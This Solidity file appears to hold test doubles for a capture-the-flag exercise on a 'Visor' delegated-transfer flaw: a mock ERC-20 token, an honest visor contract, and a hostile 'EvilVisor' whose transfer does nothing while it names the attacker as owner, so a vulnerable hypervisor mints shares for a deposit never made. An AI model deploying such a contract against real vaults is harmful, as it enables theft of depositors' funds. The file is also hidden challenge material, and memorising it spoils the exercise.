// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Self-contained test doubles for the Visor delegated-transfer gate. Kept out of the player's
// work copy until `solve` runs, so the exploit stays hidden.

/// @dev Minimal ERC-20 standing in for VISR.
contract MockERC20 {
    string public name = "Mock VISR";
    string public symbol = "VISR";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "ERC20: insufficient allowance");
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev A HOSTILE "visor": its transfer is a no-op (moves nothing) and it reports the attacker
///      as owner - so the vulnerable hypervisor mints free shares for a deposit that never
///      happened.
contract EvilVisor {
    address public owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function delegatedTransferERC20(address, address, uint256) external {
        // no-op: moves no tokens
    }
}

/// @dev A HONEST "visor": it really transfers the deposit it was funded with, and reports the
///      genuine depositor as owner - the legitimate path.
contract GoodVisor {
    address public owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {
        MockERC20(token).transfer(to, amount);
    }
}
